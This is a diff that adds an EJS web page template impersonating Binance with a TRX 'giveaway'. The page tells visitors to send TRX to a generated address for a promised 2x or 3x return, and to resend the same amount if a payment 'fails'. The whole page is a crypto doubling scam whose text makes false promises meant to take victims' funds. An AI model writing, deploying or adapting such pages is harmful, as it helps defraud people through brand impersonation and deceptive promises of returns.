@@ -1,0 +1,134 @@
+<%- include("partials/header"); -%>
+
+<body>
+  <div class="container">
+    <img id="img" src="/img/images/Binance-Logo.png" alt="binance" />
+    <div class="container-box" id="container-box">
+      <p>
+        To verify your TRX address, just send from <span id="minAmount">1.17</span> to <span id="maxAmount"></span> TRX to the
+        generated address below and get from <span id="min2"></span> to <span id="max2"></span> TRX (you will earn 3x
+        bonus if you send 15000 TRX and above) sent back to the address you sent
+        TRX from or the one you specified below, you will get double of what
+        you send to the giveaway address.
+      </p>
+      <p>
+        In this event, participant will get 2x (or 3x) of what they send to
+        the giveaway address within 10 to 20 minutes which can be traded on
+        any exchange.
+      </p>
+      <h2>how to participate</h2>
+      <ul>
+        <li>
+          <span>step 1: </span>Make sure you have at least <span class="minAmount"></span> TRX or above in
+          your wallet.
+        </li>
+        <li>
+          <span>step 2: </span>Enter the amount you wish to participate with
+          below.
+        </li>
+        <li><span>step 3: </span>Enter your TRX address.</li>
+        <li>
+          <span>step 4: </span>Click the "Generate Payment" button to generate the payment address.
+        </li>
+        <li>
+          <span>step 5: </span>Click "Pay Now" to send the amount you have entered to the giveaway
+        </li>
+        <li><span>step 6: </span>Confirm payment.</li>
+        <li><span>step 7: </span>Wait for at least 10 minutes.</li>
+      </ul>
+      <p>
+        The 2x bonus will be sent to the address you entered or the one you
+        sent the TRX from.
+      </p>
+      <p>
+        <i>If the transaction does not process correctly, please try again
+          with same amount to the Generated address, and it should go through.
+          Your original transaction will merge with the new one, and the bonus
+          for the two will be sent back.</i>
+      </p>
+    </div>
+    <div class="container-box box">
+      <div class="form">
+        <div class="input-group">
+          <div class="input">
+            <label>amount:</label>
+            <div class="input-box">
+              <img src="/img/images/Binance.png" alt="Binance" />
+              <input type="number" onkeyup="bonusCalculation()" name="amount" class="amount" />
+            </div>
+            <span id="_lessThan"></span>
+          </div>
+          <span>=</span>
+          <div class="input">
+            <label>bonus:</label>
+            <div class="input-box">
+              <img src="/img/images/Binance.png" alt="Binance" />
+              <input type="number" readonly name="bonus" class="bonus" />
+            </div>
+          </div>
+        </div>
+      <div class="input-address">
+          <label for="address">address:</label>
+          <input type="text" required name="address" id="address" />
+          <span class="warning"></span>
+        </div>
+        <button id="btn" class="btn">generate payment</button>
+      </div>
+      <a href="#">Last chance to get your TRX</a>
+      
+      <p>Support Exchange</p>
+
+      <%- include("partials/addons"); -%>
+
+    </div>
+  </div>
+
+  <div class="paybox" id="paybox">
+    <div class="box">
+      <div class="pay-box">
+        <img class="addressImage" style="text-align: center;" alt="trx-address" />
+        <p style="text-align: center;">Transfer <span id="payment-amount">******</span> <span class="coin">****</span> to binance checkout for your giveaway top-up.</p>
+        <p style="text-align: center;">0 confirmation</p>
+        <span>address: </span>
+        <div class="copy-box">
+          <p class="payment-address"></p>
+          <button class="copy-btn material-symbols-sharp"> content_copy</button>
+        </div>
+        <br />
+        <span>amount: </span>
+        <div class="copy-box">
+          <p class="payment-amount">*****</p>
+          <button class="copy-btn material-symbols-sharp"> content_copy</button>
+        </div>
+      </div>
+      <button class="btn-checkout">confirm checkout</button>
+    </div>
+  </div>
+  <%- include("partials/checkoutcore") -%>
+  <script src="/jscript/main.js"></script>
+  <script>
+    const img = document.querySelector(".addressImage");
+    img.src = "/img/images/address/trx-address.PNG";
+    img.style.display = "none";
+    const address = document.querySelector(".payment-address");
+    address.innerText = trxAddress;
+    coin.innerText = "trx";
+    payCoin.innerHTML = "trx";
+
+    let _lessThan = 5206;
+    let _greaterThan = 20000;
+
+    maxAmount.innerText = _greaterThan;
+    minAmount.innerText = _lessThan;
+    
+    const x2maxAmount = _greaterThan * 2;
+    const x2minAmount = _lessThan * 2;
+    
+    max2Amount.innerText = x2maxAmount;
+    min2Amount.innerText = x2minAmount;
+    
+    document.querySelector(".minAmount").innerHTML = _lessThan;
+  </script>
+</body>
+
+</html>
